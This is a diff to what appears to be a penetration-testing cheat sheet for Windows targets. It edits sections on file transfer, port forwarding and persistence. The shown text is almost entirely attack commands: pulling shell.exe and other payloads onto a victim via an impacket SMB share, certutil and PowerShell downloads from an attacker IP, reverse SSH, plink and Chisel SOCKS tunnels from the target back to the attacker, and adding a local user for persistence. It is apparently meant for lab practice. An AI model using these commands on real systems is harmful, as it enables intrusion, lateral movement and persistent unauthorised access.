@@ -80,14 +80,12 @@ https://github.com/SecWiki/windows-kernel-exploits
 
 ____   
 
-
 # File Transfer     
     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
     copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe
 
     certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
     
-  
 ## Powershell
     powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
     powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
@@ -110,17 +108,26 @@ ____
  ____   
  # Port Forwarding
  Expose internal services, usually hidden due to firewall rules. 
- ## Plink
+## SSH (Window 10 and newer)
+     [from target box to expose SMB ]
+     ssh -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 
+## Plink.exe
      [upload plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)  
      plink.exe -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS   <-note entering in your password on a victim box is a bad idea
      
      [generate ssh keys on kali, convert to putty keys and then upload with plink.exe to target ] 
      sudo apt install putty-tools 
      puttygen KEYFILE -o OUTPUT_KEY.ppk 
-     cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
- ## SSH (Window 10 and newer)
-     [from target box to expose SMB ]
-     ssh -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
+     cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N 
+## Chisel 
+Good for getting through firewalls, need correct copies of binaries on both target / attack box  
+Need to change /etc/proxychains4.conf socks4 to socks5 on attack box 
+### Chisel socks Reverse Proxy 
+    attack    ./chisel server -p LISTEN_PORT --reverse &  
+    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks & 
+### Chisel socks Forward Proxy 
+    target    ./chisel server -p LISTEN_PORT --socks5  
+    kali    ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks 
  ____
  # Persistence
      net user USERNAME PASSWORD /add
